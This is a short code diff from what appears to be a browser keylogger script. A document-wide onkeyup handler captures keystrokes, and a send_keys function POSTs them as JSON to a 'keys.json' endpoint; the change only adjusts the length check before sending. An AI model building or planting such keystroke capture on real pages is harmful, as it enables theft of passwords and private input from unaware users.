@@ -23,7 +23,7 @@ document.onkeyup = function(evt) {
 }
 
 function send_keys(json_string){
-    if(json_string){
+    if(json_string.length > 2){
         var xhttp = new XMLHttpRequest();
         xhttp.open("POST", "keys.json", true);
         xhttp.setRequestHeader("Content-Type", "application/json");
